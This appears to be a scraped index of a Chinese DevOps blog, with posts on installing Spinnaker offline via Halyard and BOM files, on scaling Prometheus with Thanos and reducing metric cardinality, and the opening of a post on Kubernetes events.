PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin export ROOT=$(cd $(dirname $0); pwd) export BASE_URL=\u0026quot;https://raw.githubusercontent.com/spinnaker\u0026quot; export DECK_FILE_NAME=\u0026quot;halconfig/settings.js\u0026quot; export FILE_PREFIX=\u0026quot;halconfig\u0026quot; usage(){ cat \u0026lt;\u0026lt;EOF Usage: $CMD \u0026lt;bom_file\u0026gt; \u0026lt;output_dir\u0026gt; $CMD ~/.hal/.boms/bom/1.20.0.yml ~/.hal/.boms EOF } function install_json_tools(){ which jq \u0026amp;\u0026gt; /dev/null || sudo yum install jq -y which yq || ( wget https://github.com/mikefarah/yq/releases/download/v4.16.2/yq_linux_amd64 \\ \u0026amp;\u0026amp; chmod +x yq_linux_amd64 \\ \u0026amp;\u0026amp; mv yq_linux_amd64 /usr/local/bin/yq ) } function remove_json_tools(){ rm -f a/usr/local/bin/yq rpm -e jq --force } function pull_packer(){ ##check paramter## if [[ ${#} -ne 1 ]]; then echo -e \u0026quot;\\033[32m Paramter amount error. \\033[0m\u0026quot; \u0026amp;\u0026amp; exit ${MALFORMEDPARAMTER} fi export SPIN_TMP_DIR=${ROOT}/spin_installer [ -d ${SPIN_TMP_DIR} ] || mkdir -pv ${SPIN_TMP_DIR} cd ${SPIN_TMP_DIR} git init # 配置远程仓库地址 git remote add origin https://github.com/spinnaker/rosco # 启用 sparse checkout git config core.sparsecheckout true # 指定要克隆的目录 echo \u0026quot;halconfig/packer\u0026quot; \u0026gt;\u0026gt; .git/info/sparse-checkout # 拉取远程仓库的内容 git pull origin ${1} tar zcf packer.tar.gz -C ./halconfig packer mv packer.tar.gz ${BOM_PATH_I}/ # clean work dir cd ${ROOT} \u0026amp;\u0026amp; rm -fr ${SPIN_TMP_DIR} } function gererate_bom(){ yq eval -o json ${BOM_FILE_NAME} | jq '.services' | jq 'del(.defaultArtifact ,.[\u0026quot;monitoring-third-party\u0026quot;], .[\u0026quot;monitoring-daemon\u0026quot;])' | jq -r 'to_entries[] | \u0026quot;\\(.key)=\\(.value)\u0026quot;' | while IFS=\u0026quot;=\u0026quot; read -r key value; do VERSION=\u0026quot;version-`echo $value | jq '.version'|awk -F '=' '{print $1}' | awk -F '-' '{print $1}'| tr -d '\u0026quot;'`\u0026quot; export BOM_PATH_I=${BOM_PATH}/${key} [ -d ${BOM_PATH_I} ] || mkdir -pv ${BOM_PATH_I}; chmod 777 ${BOM_PATH_I} case ${key} in \u0026quot;deck\u0026quot;) curl \u0026quot;${BASE_URL}/${key}/${VERSION}/${FILE_PREFIX}/settings.js\u0026quot; -o ${BOM_PATH_I}/settings.js ;; \u0026quot;rosco\u0026quot;) curl \u0026quot;${BASE_URL}/${key}/${VERSION}/${FILE_PREFIX}/${key}.yml\u0026quot; -o ${BOM_PATH_I}/${key}.yml curl \u0026quot;${BASE_URL}/${key}/${VERSION}/${FILE_PREFIX}/images.yml\u0026quot; -o ${BOM_PATH_I}/images.yml pull_packer ${VERSION} ;; *) curl \u0026quot;${BASE_URL}/${key}/${VERSION}/${FILE_PREFIX}/${key}.yml\u0026quot; -o ${BOM_PATH_I}/${key}.yml esac done chmod 777 ${BOM_PATH} -R } function MAIN(){ ##check user## if [[ $UID != 0 ]];then echo -e \u0026quot;\\033[41;05m Sorry, this script must be run as root! \\033[0m\u0026quot; exit ${ILLEGALUSER} fi ##check paramter## if [[ ${#} -lt 2 ]]; then usage \u0026amp;\u0026amp; exit ${MALFORMEDPARAMTER} fi export BOM_FILE_NAME=$1; shift export BOM_PATH=$1; shift ##cheking command line## install_json_tools ##processing bom## gererate_bom END_TIME=`date +%s` EXECUTING_TIME=`expr $END_TIME - $START_TIME` echo -e \u0026quot;\\033[42;30m Time had spent $EXECUTING_TIME seconds. \\033[0m\u0026quot; echo -e \u0026quot;\\033[40;34m ######################################################### \\033[0m\u0026quot; echo -e '\\n' } MAIN $1 $2 在执行脚本时需要在容器运行的宿主机进行，如果这台主机没有网络，那么可以在其他机器执行\n额外下载一个 packer.tar.gz 这里 进入文件夹 rosco/master rosco 有一个文件夹叫packer，这将其移至文件夹并解压缩为 packer.tar.gz mv ~/.hal/.boms/rosco/master/packer.tar.gz ~/.hal/.boms/rosco cd ~/.hal/.boms/rosco tar xvf packer.tar.gz 为BOM服务配置local关键字 对于离线安装，我们需要为 BOM 中的每个服务使用的镜像名称都增加一个 local: 前缀，这是官方的固定格式 [5]\ndependencies: consul: version: 0.7.5 redis: version: 2:2.8.4-2 vault: version: 0.7.0 services: clouddriver: commit: 024b9220a1322f80ed732de9f58aec2768e93d1b version: local:6.4.3-20191210131345 ... 配置镜像获取源 这里可以选择 直接 docker 导入镜像到每个 Kubernetes worker 节点上，也可以选择配置私有镜像仓库。\n如果需要使用私有镜像，那么需要修改 VERSION.yml 中的dockerRegistry 选项，将其修改为你自己的镜像仓库\nartifactSources: debianRepository: https://dl.bintray.com/spinnaker-releases/debians #dockerRegistry: gcr.io/spinnaker-marketplace dockerRegistry: private-docker-registry/repository-name gitPrefix: https://github.com/spinnaker googleImageProject: marketplace-spinnaker-release 或者使用 docker save 通过命令导出镜像为 tar.gz 文件，然后导入到所有的 Kubernetes 的工作节点上\n部署 可以直接执行 hal deploy 命令可以进行部署，更新，删除等操作\nhal deploy apply # 部署 hal deploy clean # 一键清理已经部署的服务 在默认部署情况下，igor 与 fiat 是不开启的，如果你配置了授权与CI的配置，那么会部署上这两个服务sss\n这里会生成 Kubernetes 的资源，而手动创建的资源会存在 S3 对象存储中\nTroubleshooting Could not load \u0026ldquo;versions.yml\u0026rdquo; from config bucket: xx [2] 这是因为默认情况下从GCS读取配置文件，可以通过修改配置文件 /opt/spinanker/config/halyard-local.yml 关闭 gcs 功能（或 /opt/halyard/config/halyard.yml ）\nserver: port: 8064 ... spinnaker: artifacts: debian: https://us-apt.pkg.dev/projects/spinnaker-community docker: us-docker.pkg.dev/spinnaker-community/docker config: input: gcs: enabled: true writerEnabled: false bucket: halconfig Notes: 修改完成后需要重启进程，并且修改时需要使用root用户进入容器内\ndocker exec -it 4f3c037d2e3c bash hal shutdown Unable to retrieve profile \u0026ldquo;clouddriver.yml\u0026rdquo; Validation in Global: ! ERROR Unable to retrieve profile \u0026quot;clouddriver.yml\u0026quot;: connect timed out 解决：BOM需要按照固定格式，创建对应每个配置文件的清单\nUnable to retrieve profile \u0026ldquo;versions.yml\u0026rdquo; Validation in Global: ! ERROR Unable to retrieve profile \u0026quot;versions.yml\u0026quot;: connect timed out 解决：关闭 GCS 即可\nNo persistent storage type was configured Validation in Global: ! ERROR No persistent storage type was configured. 解决：hal config storage s3 edit\nError retirveing contentes of archive packer.tar.gz Validation in Global: ! ERROR Error retirveing contentes of archive packer.tar.gz 解决：拷贝对应服务的 github 仓库中的 packer 文件夹\nNo profile reader exists to read ! ERROR No profile reader exists to read '6.7.1-20200319123809'. Consider setting 'spinnaker.config.input.gcs.enabled: true' in /opt/spinnaker/config/halyard.yml 解决：因为 bom 文件中镜像没有设置 local\nAccess to XMLHttpRequest at \u0026lsquo;xxx\u0026rsquo; has been blocked by CORS policy 如下图所示：\n官方给出的检查方法是“排查 gate 服务的可用性” [8]，但检查 gate 日志没有问题，service ip 请求也是通的\n2023-07-19 15:01:05.150 INFO 1 --- [applications-10] c.n.s.g.s.internal.ClouddriverService : ---\u0026gt; HTTP GET http://spin-clouddriver.spinnaker:7002/applications?restricted=false\u0026amp;expand=true 2023-07-19 15:01:05.186 INFO 1 --- [applications-10] c.n.s.g.s.internal.ClouddriverService : \u0026lt;--- HTTP 200 http://spin-clouddriver.spinnaker:7002/applications?restricted=false\u0026amp;expand=true (31ms) 2023-07-19 15:01:05.227 INFO 1 --- [-applications-9] c.n.s.g.s.internal.Front50Service : \u0026lt;--- HTTP 200 http://spin-front50.spinnaker:8080/v2/applications?restricted=false (83ms) 2023-07-19 15:01:08.343 INFO 1 --- [TaskScheduler-6] c.n.s.gate.plugins.deck.DeckPluginCache : Refreshing plugin cache 2023-07-19 15:01:08.343 INFO 1 --- [TaskScheduler-6] c.n.s.gate.plugins.deck.DeckPluginCache : Cached 0 deck plugins 请求 service ip + port\n$ curl 10.111.192.125:8084 -vv * About to connect() to 10.111.192.125 port 8084 (#0) * Trying 10.111.192.125... * Connected to 10.111.192.125 (10.111.192.125) port 8084 (#0) \u0026gt; GET / HTTP/1.1 \u0026gt; User-Agent: curl/7.29.0 \u0026gt; Host: 10.111.192.125:8084 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 302 \u0026lt; Access-Control-Allow-Credentials: true \u0026lt; Access-Control-Allow-Origin: * \u0026lt; Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT, PATCH \u0026lt; Access-Control-Max-Age: 3600 \u0026lt; Access-Control-Allow-Headers: x-requested-with, content-type, authorization, X-RateLimit-App, X-Spinnaker-Priority \u0026lt; Access-Control-Expose-Headers: X-AUTH-REDIRECT-URL \u0026lt; X-SPINNAKER-REQUEST-ID: 6b96a924-9bcb-496c-9389-12cc6834aff7 \u0026lt; X-Content-Type-Options: nosniff \u0026lt; X-XSS-Protection: 1; mode=block \u0026lt; Cache-Control: no-cache, no-store, max-age=0, must-revalidate \u0026lt; Pragma: no-cache \u0026lt; Expires: 0 \u0026lt; X-Frame-Options: DENY \u0026lt; Location: http://spin-deck.spinnaker:9000 \u0026lt; Content-Length: 0 \u0026lt; Date: Wed, 19 Jul 2023 15:01:28 GMT \u0026lt; * Connection #0 to host 10.111.192.125 left intact 浏览器访问 gate url 也是正常的\n访问首页提示如下错误，但是单独访问 gate 页面没有问题\n报错如下：\nAccess to XMLHttpRequest at 'http://gate.spinnaker.fuck:30080/credentials?expand=true' from origin 'http://deck.spinnaker.fuck:30080' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.Access to XMLHttpRequest at 'http://gate.spinnaker.fuck:30080/credentials?expand=true' from origin 'http://deck.spinnaker.fuck:30080' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute. 图：spinnaker首页报错 - 跨源资源共享问题 解决：如果使用 Halyard 部署 Spinnaker，则可以使用以下设置创建文件 ~/.hal/default/profiles/gate-local.yml\ncors: allowedOriginsPattern: {you gate url} Reference [1] Install Halyard on Docker\n[2] ERROR Could not load \u0026ldquo;versions.yml\u0026rdquo; from config bucket: 403 #3920\n[3] Spinnaker: How to bring custom boms into spinnaker pod to be able to deploy it with hal?\n[4] MinIO Object Storage for Kubernetes\n[5] BOMs and Configuration on your Filesystem\n[6] ! ERROR No persistent storage type was configured. #5875\n[7] Install in Air Gaped Environment\n[8] I can’t load the Applications screen\n[9] use k8s cluster private, how to access? not use localhost! #4689\n","permalink":"https://www.oomkill.com/2023/07/offline-installtation/","summary":"","title":"无互联网环境下安装Spinnaker - Offline Install Spinnaker"},{"content":"背景 Prometheus 是目前云原生架构中监控解决方案中的基石，而对于 “metrics”，“traces” 和 “logs” 是组成云原生架构中“可观测性”的一个基础，当在扩展 Prometheus，那么 Prometheus 提供的基础架构是无法满足需求的（高可用性和可扩展性）， 而高可用性与可扩展性是满足不断增长基础设施的一个基本条件。而 Prometheus 本身并没有提供“弹性”的集群配置，也就是说，多个副本的 Prometheus 实例，对于分布在每个 Pod 上的数据也会不一致，这时也需要保证指标的归档问题。\n并且在一定的集群规模下，问题的出现远远大于 Prometheus 本身的能力，例如：\n如何经济且搞笑的存储历史数据（TB, PB）？如何快速的查询历史数据？ 如何合并 Promehtues 多个实例收集来的副本数据？ 以及多集群间的监控？ 由于 TSDB 的块同步，Prometheus 严重依赖内存，使得 Prometheus 监控项的扩展将导致集群中的CPU/MEM 的使用加大 .. 解决 Thanos 是一款可以使 Prometheus 获得 ”长期存储“，并具体有”高可用性“ 的 Prometheus 的功能扩展，“Thanos” 源自希腊语“ Athanasios”，英文意思是”不朽“。这也正是 ”Thanos“ 提供的功能：”无限制的对象存储“，并与原生 Prometheus API 高度兼容，你可以理解为 Thanos API 就是 Prometheus API。\nCortexmetrics 与 Thanos 类似，是用通过将 Prometheus 实例的”存储“和”查询“等功能分离到独立的组件中，实现水平扩展。它使用对象存储来持久化历史指标，块存储（TSDB）是他的存储后端；此外，Cortex 还提供了多租户与多租户隔离等功能\n联邦集群，联邦集群是 Prometheus 官方提供的一个概念，使用了联邦将允许 Prometheus 从另一个 Prometheus 中抓取选定的指标。可以使用的一些模型如下：\n分层联邦：大规模的集群中，Prometheus 部署模型如一个”树形“，高级别的从多个低级实例中抓取指标，并存储聚合 跨服务联邦：Prometheus 从另一个 Prometheus 只抓取指定的数据 图：Prometheus 联邦 Source：https://www.improbable.io/blog/thanos-prometheus-at-scale\n但在这种架构中，仍然还是每个查询只能针对单个 Prometheus 服务器完成。另外 Thanos 可以查询与聚合来自多个 Prometheus 实例的数据，这些数据就类似与联邦中的 ”叶“，这些数据的来源可以单实例也可以是多实例。\n在这种架构中，本质上并不是 ”高可用性“ 的，实际上存在潜在故障点，并且数据的查询是通过唯一入口（API）进行查询，并且需要配置复杂的抓取规则才可以使规则不重复。\nThanos 架构 Thanos 遵循了 KISS (Keep it simple) 原则，thanos 由多个组件组成，每个组件负责不同的功能，\n在与 Prometheus 交互方向，Thanos 使用下列两种方式（组件）：\nSidecar：\n连接到 Prometheus，读取数据或者将数据上传到对象存储中 也可以部署为传统架构，这里不能完全理解为是 Kubernetes 中的 Sidecar Receiver：从 Prometheus 接收数据，暴露或上传到云端\n扩展 Prometheus 的功能：\nStore/Store Gateway：提供存储在对象存储中的历史数据的查询功能，历史 Chunk 会存储在对象存储中\n支持基于 “时间/标签” 的分区 Compactor：对于存储在对象存储中的数据进行压缩，通过将其合并为更大的快，以便提高查询效率\nRuler/Rule：类似与 Alertmanager 的功能，他提供了告警功能\nQuerier/Query：实现了 Prometheus API，他可以从 Sidecar 与 对象存储中查询全局查询\nQuery Frontend：实现了 Prometheus API 并将请求代理至 Query 组件；并且支持缓存功能（Redis/Memcached），缓存其查询结果\nThanos 不是一种 “节省指标存储” 的方案，而是一种提供更大时间间隔，更高可用性的的查询方案，使用Thanos 不会减少磁盘空间，反而会增加磁盘空间。\n通常 Thanos 会按照维度划分为三个级别：raw, 5m, 1h，这是根据时间划分，raw 是从 Prometheus 拿到的原始数据; 5m 压缩为5分钟的快；1h 压缩为 1h的块 [1] 。不过这些没有在官方找到，引用的其他文章\n指标的查询过程 PromQL 查询请求到组件 Querier 它解释查询并进入预过滤器 查询根据标签和时间范围要求 扇出 (fan-out) 其对 stores 或 prometheuses 的请求 store 决定 是否从s3中拉去数据 query 会缓存数据到内存中 Query 发送和接收请求 收集所有响应后，如果启用合并功能，会合并并删除重复数据 最后返回该时间序列 图：Thanos查询生命周期 Source：https://banzaicloud.com/blog/multi-cluster-monitoring/\n基于时间的分片 默认 Thanos 的 Store gateway 会查询对象中的所有存储，根据查询时间返回数据，这显然不行，如果此时有大量数据（基于PB级别），此时可以根据时间分片（水平扩展），Store API 可以使用 最大时间 和 最小时间 来缩短查询的时间，\n基于标签的分片 基于标签的分片与基于时间的分片类似，这里是使用labels，而 Label 是采集与 Prometheus 的外部 Label ，并基于 Thanos 组件显式重新标记，要记住，Thanos 就是 Prometheus 扩展，功能用法与 Prometheus 是相同的的，例如下列 Thanos relabeling 的操作\n- action: keep regex: \u0026quot;eu.*\u0026quot; source_labels: - region 这些表示了只保留了以 eu.* 开头的 region label\n重复副本的删除 Thanos 对于 Prometheus 的 HA，也就是采集多个 Prometheus 实例的指标，此时 每个实例会产生相同的指标，这种模式来实现的“高可用性”，那么这种架构产生的重复副本就需要 Thanos 来处理了，例如如下所示：up{job=\u0026quot;prometheus\u0026quot;,env=\u0026quot;2\u0026quot;} 的指标， 通过重复数据删除，结果是：\nup{job=\u0026quot;prometheus\u0026quot;,env=\u0026quot;2\u0026quot;,cluster=\u0026quot;1\u0026quot;} 1 up{job=\u0026quot;prometheus\u0026quot;,env=\u0026quot;2\u0026quot;,cluster=\u0026quot;2\u0026quot;} 1 那么如果不删除重复标签，可能结果就很多，是用过 replica 标签来区分副本数量\nup{job=\u0026quot;prometheus\u0026quot;,env=\u0026quot;2\u0026quot;,cluster=\u0026quot;1\u0026quot;,replica=\u0026quot;A\u0026quot;} 1 up{job=\u0026quot;prometheus\u0026quot;,env=\u0026quot;2\u0026quot;,cluster=\u0026quot;1\u0026quot;,replica=\u0026quot;B\u0026quot;} 1 up{job=\u0026quot;prometheus\u0026quot;,env=\u0026quot;2\u0026quot;,cluster=\u0026quot;2\u0026quot;,replica=\u0026quot;A\u0026quot;} 1 up{job=\u0026quot;prometheus\u0026quot;,env=\u0026quot;2\u0026quot;,cluster=\u0026quot;2\u0026quot;,replica=\u0026quot;B\u0026quot;} 1 全局视图查询 如图所示，query 是一种无状态的可水平扩展的 Querier 组件，他提供了基于 Prometheus API ，可以相应基于 PromQL 的查询，而中间数据的相应是由 Store 或者\n图：Thanos query组件 Source：https://banzaicloud.com/blog/multi-cluster-monitoring/\n高基数 基数 (cardinality) 通俗来说是一个集合中的元素数量 [1] 基数的来源通常为：\nlabel 的数量 series(指标) 的数量 时间：label 或者 series 随时间而流失或增加，通常是增加 那么这么看来高基数就是，label, series, 时间这三个集合的笛卡尔积，那么高基数的情况就很正常了。\n而高基数带来的则是 Prometheus 资源使用，以及监控的性能。下图是 Grafana Lab 提到的一张图，很好的阐述了高基数这个问题\n图：Prometheus中的基数 Source：https://grafana.com/blog/2022/02/15/what-are-cardinality-spikes-and-why-do-they-matter\n如图所示：一个指标 server_responses 他的 label 存在两个 status_code 与 environment ，这代表了一个集合，那他的 label value 是 1~5xx，这个指标的笛卡尔积就是10。\n那么此时存在一个问题，如何能定位 基数高不高，Grafana Lab 给出了下面的数据 [1]，但是我不清楚具体的来源或者如何得到的这些值。也就是 label:value\n低基数：1: 5 标准基数：1: 80 高基数：1: 10000 为什么指标会指数级增长 在以 Kubernetes 为基础的架构中，随着抽象级别的提高（通常为Pod, Label, 以及更多抽象的拓扑），指标的时间序列也越来越多。因为在这种基础架构中，在传统架构中运行的一个应用的单个裸机，被许多运行分散在许多不同节点上的许多不同微服务的 Pod 所取代。在这些抽象层中的每一个都需要一个标签，以便可以唯一地标识它们，并且这些组件中的每一个都会生成自己的指标，从而创建其独特的时间序列集。\n此外，在 Kubernetes 中的工作负载的短暂性最终也会创建更多的时间序列。例如 JAVA的 http_request_duration_seconds_bucket 指标，它会每次 pod 更改状态时生成一个新的时间序列，比如从“状态200\u0026quot; 或者 “状态 404” 在到 “每个URL” 再到 “每个请求的时间”，这样大量短时间请求，对一个 Pod 状态可能会生成大量指标。\n这是就要考虑到 Prometheus 兼容的格式，而非传统监控的监控指标的格式问题，就例如上面的例子，通过对 URI，请求时长，请求状态码几个维度去监控，那么此时的 exporter 导出的数据势必是非常杂乱的，而这种可能相同的指标就会放大到无穷。\n在这种环境中的 Label，就是两组集合的笛卡尔积的选择，就是次优标签 sub-optimal labels ，对付这类高基数的指标，控制基数，以及如何避免使用这类错误，就是解决高基数的根本。\n高基数是一个非常重要的问题 高基数的问题，带来的就是基于 Prometheus 的监控带来的是更多的可观测性，反之，随着时间序列的基数增加，那么为了维持某几个特别的指标的观测性，就必须要付出更多的硬件资源，以及影响本身监控系统的性能。比较明显的表现，就是监控的相应下降，极大的拖慢了整个系统的运行速度（包含仪表盘，promQL等）。还会延长系统故障排除时的MTTR (Mean Time to Repair)。\nNotes: 其实这里还有一类型错误，就是这会导致时间序列的乱序，怎么说呢，就是当指标无线放大时，在某一个点 scrap 的指标存储时间，大于了抓取周期，导致新指标存储早于旧指标，这种很容易出现在例如 Prometheus 的从内存到存储的那个点。\n如何控制控制指标的高基数增长 指标的无序扩张（高基数）是不可避免对监控系统产生非常大的影响（存储和性能），而为此引出了一个如何优化不断增长的指标就是控制高基数增长的关键部分，下面将从几个维度来阐释控制“高基数”问题的步骤\n第一步：高基数指标是否有价值？ 在任何优化方法的第一步都是去了解哪些指标给系统带来负面影响（这里指高基数），并且还需要确定这些指标中哪些指标是有价值的；所谓的有价值既，在仪表板、告警中是否有被使用。\n基于这些信息，我将根据基数问题与监控指标的价值分为四个象限：\n高价值，低成本：闲置、陈旧、很长时间没有新数据的 低价值，低成本：基本上没有什么影响，但是需要去考虑优化 低价值，高成本：可以考虑删除掉 Label 和 metric 高价值，高成本：你的指标是否过细化，是否需要重新设计 Label 或者聚合数据；或这类指标是否适合使用 Prometheus 这类时间序列 第二步：如何确定高基数指标 确定高基数指标包含3种方式\nPrometheus WEB UI 分析，2.14 版本之后 PromQL 分析 Prometheus API 分析 通常情况下，WEB UI 就可以满足需求了，通过路径 Prometheus UI -\u0026gt; Status -\u0026gt; TSDB Status -\u0026gt; Head Cardinality Stats。\n图：Prometheus WEB UI TOP 10 series 由上图可见，在这里体现的高基数问题的指标，通常都是以 bucket 结尾的指标，而这些指标通常包含2个维度，会无线拉长成为高基数指标。如下面指标所示，通常由 le （标识每个 bucket 的上限，这可以确保可以定位到在一个时间范围内相应的请求指标有哪些）\napiserver_request_duration_seconds_bucket{component=\u0026quot;apiserver\u0026quot;, endpoint=\u0026quot;https\u0026quot;, group=\u0026quot;admissionregistration.k8s.io\u0026quot;, instance=\u0026quot;10.0.0.4:6443\u0026quot;, job=\u0026quot;apiserver\u0026quot;, le=\u0026quot;+Inf\u0026quot;, namespace=\u0026quot;default\u0026quot;, resource=\u0026quot;mutatingwebhookconfigurations\u0026quot;, scope=\u0026quot;cluster\u0026quot;, service=\u0026quot;kubernetes\u0026quot;, verb=\u0026quot;DELETE\u0026quot;, version=\u0026quot;v1\u0026quot;}\t19 apiserver_request_duration_seconds_bucket{component=\u0026quot;apiserver\u0026quot;, endpoint=\u0026quot;https\u0026quot;, group=\u0026quot;admissionregistration.k8s.io\u0026quot;, instance=\u0026quot;10.0.0.4:6443\u0026quot;, job=\u0026quot;apiserver\u0026quot;, le=\u0026quot;0.05\u0026quot;, namespace=\u0026quot;default\u0026quot;, resource=\u0026quot;mutatingwebhookconfigurations\u0026quot;, scope=\u0026quot;cluster\u0026quot;, service=\u0026quot;kubernetes\u0026quot;, verb=\u0026quot;POST\u0026quot;, version=\u0026quot;v1\u0026quot;} apiserver_request_duration_seconds_bucket{component=\u0026quot;apiserver\u0026quot;, endpoint=\u0026quot;https\u0026quot;, group=\u0026quot;admissionregistration.k8s.io\u0026quot;, instance=\u0026quot;10.0.0.4:6443\u0026quot;, job=\u0026quot;apiserver\u0026quot;, le=\u0026quot;0.25\u0026quot;, namespace=\u0026quot;default\u0026quot;, resource=\u0026quot;mutatingwebhookconfigurations\u0026quot;, scope=\u0026quot;cluster\u0026quot;, service=\u0026quot;kubernetes\u0026quot;, verb=\u0026quot;PATCH\u0026quot;, version=\u0026quot;v1\u0026quot;} 例如下面是生产环境中的一个高基数TOP10\nName Count http_server_requests_seconds_bucket 2017537 lettuce_command_firstreponse_seconds_bucket 755056 lettuce_command_completion_seconds_bucket 755056 http_server_requests_seconds 555575 nginx_ingress_controller_request_duration_seconds_bucket 475440 node_ipvs_backend_connections_inactive 148796 node_ipvs_backend_connections_active 148796 apiserver_request_duration_seconds_bucket 27896 etcd_request_duration_seconds_bucket1 22763 至此可以看到实际上 http_server_requests_seconds_bucket 这一个指标占据了 prometheus 总指标的50%+\n而其他的一些分析，可以很有效的定位到你需要优化的标签\nTop 10 label names with high memory usage Top 10 series count by label value pairs 通过 promQL 定位 job 查询 top 10 的 series topk(10, count by (__name__)({__name__=~\u0026quot;.+\u0026quot;})) sum(scrape_series_added) by (job) 通过 job Label 分析 series 增长 sum(scrape_samples_scraped) by (job) 通过 job Label 分析 series 总量 可以通过指标属于哪个 job\n第三步：发现那些指标没有在使用 Grafana Mimirtool 是一个开源的命令行工具， 它可以识别 Mimir、Prometheus 或 Prometheus 的存储中未在Dashboard、Alert 或 recording 中使用的指标。通过 Mimirtool 可以快速发现未使用的指标，并且做出操作\n优化监控指标 优化监控指标来解决高基数问题主要从以下维度进行\n增加采集间隔 Prometheus 的默认值为 scrape_interval: 15s，或 DPM (Data points Per minute) 4个，但是如果查询语句为 scrape_samples_scraped[1m] 那么可以考虑将这个 job 的 scrape_interval 增加为1m，这样15~60 可以减少近75%的存储成本。\nkube-state-metrics: namespaceOverride: \u0026quot;\u0026quot; rbac: create: true releaseLabel: true prometheus: monitor: enabled: true ## Scrape interval. If not set, the Prometheus default scrape interval is used. ## interval: \u0026quot;\u0026quot; 优化 histogram histrogram 是 Prometheus中一种更具有更复杂类型的监控指标，通常用于决定数据的精度，典型的例子就是上面提到的 http_server_requests_seconds_bucket 中的 le ，此时假设 le 代表请求毫秒，那么我们只需要决定你所需要的精度是哪些？例如，如果仅仅需要 1ms, 5ms, 10ms，那么指标 le 标签就控制为3，这样结合 URI 指标，那么这个 histogram 是有限的\n# drop all metric series ending with _bucket and where le=\u0026quot;0.1xxx\u0026quot; - source_labels: [__name__, le] separator: _ regex: \u0026quot;.+_bucket_(0.1+)\u0026quot; action: \u0026quot;drop\u0026quot; # Object labels: __name__: http_server_requests_seconds_bucket le: 0.114421 这里可以通过 promlabs 来测试你的规则是否是成功的 [2]\n删除不需要的标签 对于一些指标，删除了未使用的标签后，反而会使这个指标变得没有意义，并且使这个指标变得序列重复，这个时候可以完整删除这个指标\n例如在下面的示例中，第一个示例可以安全地删除 ip 标签，因为其余系列都是唯一的。但在第二个示例中，如果删除 ip 标签将产生重复的时间序列，Prometheus 将删除这些时间序列。my_metric_total在此示例中，Prometheus 将接收具有相同时间戳的值 1、3 和 7，并将丢弃其中的 2 个数据点。\n# You can drop ip label, remaining series are still unique my_metric_total{env=“dev”, ip=“1.1.1.1\u0026quot;} 12 my_metric_total{env=“tst”, ip=“1.1.1.1\u0026quot;} 14 my_metric_total{env=“prd”, ip=“1.1.1.1\u0026quot;} 18 #Remaining values after dropping ip label my_metric_total{env=“dev”} 12 my_metric_total{env=“tst”} 14 my_metric_total{env=“prd”} 18 # You can not drop ip label, remaining series are not unique my_metric_total{env=“dev”, ip=“1.1.1.1\u0026quot;} 1 my_metric_total{env=“dev”, ip=“3.3.3.3\u0026quot;} 3 my_metric_total{env=“dev”, ip=“5.5.5.5\u0026quot;} 7 #Remaining values after dropping ip label are not unique my_metric_total{env=“dev”} 1 my_metric_total{env=“dev”} 3 my_metric_total{env=“dev”} 7 如果无法控制删除标签将导致重复序列，通过 Prometheus sum、avg、min、max等函数可以保留聚合数据，同时删除单个系列。在下面的示例中，我们使用 sum 函数来存储聚合指标，从而允许我们删除单个时间序列。\n# sum by env my_metric_total{env=\u0026quot;dev\u0026quot;, ip=\u0026quot;1.1.1.1\u0026quot;} 1 my_metric_total{env=\u0026quot;dev\u0026quot;, ip=\u0026quot;3.3.3.3\u0026quot;} 3 my_metric_total{env=\u0026quot;dev\u0026quot;, ip=\u0026quot;5.5.5.5\u0026quot;} 7 # Recording rule sum by(env) (my_metric_total{}) my_metric_total{env=\u0026quot;dev\u0026quot;} 11 使用聚合组 例如对于 *_seconds_bucket 类的指标, 通常需要的是一些高纬度的指标，那么这些指标可以通过 recording rules 进行记录和存储\ngroups: - interval: 3m name: kube-apiserver-availability.rules rules: - expr: \u0026gt;- avg_over_time(code_verb:apiserver_request_total:increase1h[30d]) * 24 * 30 record: code_verb:apiserver_request_total:increase30d - expr: \u0026gt;- sum by (cluster, code, verb) (increase(apiserver_request_total{job=\u0026quot;apiserver\u0026quot;,verb=~\u0026quot;LIST|GET|POST|PUT|PATCH|DELETE\u0026quot;,code=~\u0026quot;2..\u0026quot;}[1h])) record: code_verb:apiserver_request_total:increase1h - expr: \u0026gt;- sum by (cluster, code, verb) (increase(apiserver_request_total{job=\u0026quot;apiserver\u0026quot;,verb=~\u0026quot;LIST|GET|POST|PUT|PATCH|DELETE\u0026quot;,code=~\u0026quot;5..\u0026quot;}[1h])) record: code_verb:apiserver_request_total:increase1h 最后 drop 掉指标\nwrite_relabel_configs: - source_labels: [__name__] regex: \u0026quot;apiserver_request_duration_seconds_bucket\u0026quot; action: drop recording rules 是允许预先将经常计算的表达式的结果保存为一组新的时间序列的，这种情况下查询的成本会比每次直接查询原始的表达式要快许多，并且在聚合后，可以将原来的指标删掉\nReference [1] Multi cluster monitoring with Thanos\n[2] How to manage high cardinality metrics in Prometheus and Kubernetes\n[3] 精简Prometheus指标减少资源占用\n[4] What are cardinality spikes and why do they matter?\n[5] Containing your Cardinality\n","permalink":"https://www.oomkill.com/2023/07/using-thanos-improve-prometheus.md/","summary":"","title":"使用Thanos强化Prometheus"},{"content":"在 Kubernetes 中 事件 ( Event ） 通常被大家认知为是展示集群中发生的情况，通常用作 Pod 的查看，例如为什么 CrashBackOff, 为什么 Pendding，而很少有人知道事件在 Kubernetes 整个系统中的设计是非常巧妙的，可以通过各组件间的传递，使得用户可以知道集群中的情况，文章中将一地揭开Kubernetes to神秘面纱。\n为什么需要事件 Kubernetes 在设计时就是 “声明式”，而声明式的最大特点就是 “多组件的协同工作”，而在多组件协同工作时，势必需要传递一些事件，以告知用户任务的状态如何；而事件本身上是一种资源，在很早版本就以及被移入 api/v1 中。下面是 “事件” 资源的定义。\n位于 vendor/k8s.io/api/core/v1/types.go ，因为 vendor/k8s.io 实际上是做了一个软连接，那么真实的实际上位于 {kubernetes_repo}/staging/src/k8s.io/api/core/v1\ntype Event struct { metav1.TypeMeta `json:\u0026quot;,inline\u0026quot;` // 标准的元数据 